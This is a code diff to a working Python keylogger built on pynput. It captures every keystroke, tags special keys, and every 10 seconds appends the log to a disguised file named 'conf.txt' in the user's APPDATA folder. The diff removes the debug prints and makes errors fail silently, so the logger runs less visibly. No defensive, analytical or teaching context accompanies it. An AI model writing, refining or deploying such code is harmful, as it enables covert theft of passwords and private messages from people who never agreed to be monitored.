@@ -2,14 +2,14 @@
 import pynput.keyboard
 import threading
 import os
-import logging
 
 class KeyLogger:
     def __init__(self):
         self.log = ""
-        self.path = os.environ["APPDATA"] + "\\conf.txt"
+        self.path = os.path.join(os.environ["APPDATA"] + "\\conf.txt")
         self.listener = None
         self.timer = None
+        self.running = False
 
     def process_keys(self, key):
         try:
@@ -19,31 +19,50 @@ class KeyLogger:
                 self.log += " "
             elif key == key.enter:
                 self.log += "\n"
+            elif key == key.backspace:
+                self.log += "[BACKSPACE]" 
+            elif key == key.tab:
+                self.log += "[TAB]"  
+            elif key == key.esc:
+                self.log += "[ESC]"
+            elif key == key.caps_lock:
+                self.log += "[CAPSLOCK]"
+            elif key in {key.shift, key.shift_r}:
+                self.log += "[SHIFT]"
+            elif key in {key.ctrl, key.ctrl_r}:
+                self.log += "[CTRL]"
             else:
                 self.log += f" [{key}] "
         except Exception as e:
             self.log += f" [Error: {e}] "
 
-    def report(self):
-        if self.log.strip():
+    def save_to_file(self):
+        if self.log.strip(): 
             try:
                 with open(self.path, "a", encoding="utf-8") as file:
-                    file.write(self.log + "\n")
-                    print(f"Записаны логи: {self.log}")  # Для отладки
-                    self.log = ""
-            except Exception as e:
-                print(f"Ошибка записи логов: {e}")
+                    file.write(self.log)  
+                self.log = ""  
+            except Exception:
+                pass
+
+    def report(self):
+        self.save_to_file()
         self.timer = threading.Timer(10, self.report)
         self.timer.start()
 
+
     def start(self):
-        self.listener = pynput.keyboard.Listener(on_press=self.process_keys)
-        with self.listener:
-            self.report()
-            self.listener.join()
+        if not self.running:  
+            self.running = True
+            self.listener = pynput.keyboard.Listener(on_press=self.process_keys)
+            with self.listener:
+                self.report()
+                self.listener.join()
 
     def stop(self):
         if self.listener:
             self.listener.stop()
         if self.timer:
             self.timer.cancel()
+        self.save_to_file()
+        self.running = False
